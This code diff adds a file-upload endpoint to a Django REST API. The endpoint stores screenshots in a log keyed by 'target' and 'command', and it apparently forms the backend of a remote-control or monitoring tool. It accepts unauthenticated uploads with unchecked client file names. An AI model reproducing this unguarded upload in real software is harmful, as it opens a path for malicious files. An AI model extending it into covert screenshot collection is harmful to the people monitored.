@@ -1,7 +1,10 @@
 from rest_framework import response
 from rest_framework.views import APIView
+from django.core.files.storage import default_storage
+from django.conf import settings
 from .serializers import *
 from .models import *
+import os
 
 def get_client_ip(request):
     x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
@@ -130,3 +133,34 @@ class LogView(APIView):
         cmd = request.GET.get('command')
         Log.objects.filter(target=target,command=cmd).delete()
         return response.Response({'message': 'Log deleted successfully !!!'})
+    
+class UploadView(APIView):
+
+    def post(self, request):
+        data = request.data
+        target = data.get('target')
+
+        if 'file' not in request.FILES:
+            return response.Response({'error': 'No file provided!'}, status=400)
+
+        file = request.FILES['file']
+        file_path = os.path.join('uploads', file.name)
+
+        try:
+            saved_path = default_storage.save(file_path, file)
+            file_url = os.path.join(settings.MEDIA_URL, saved_path)
+
+
+            Log.objects.create(
+                target=target,
+                log=f'image uploaded sucessfuly and save on {file_path}',
+                img=file_url,
+                command="screen shot",
+            )
+
+            return response.Response({
+                'message': 'File uploaded successfully!',
+                'file_path': file_url,
+            })
+        except Exception as e:
+            return response.Response({'error': str(e)}, status=500)
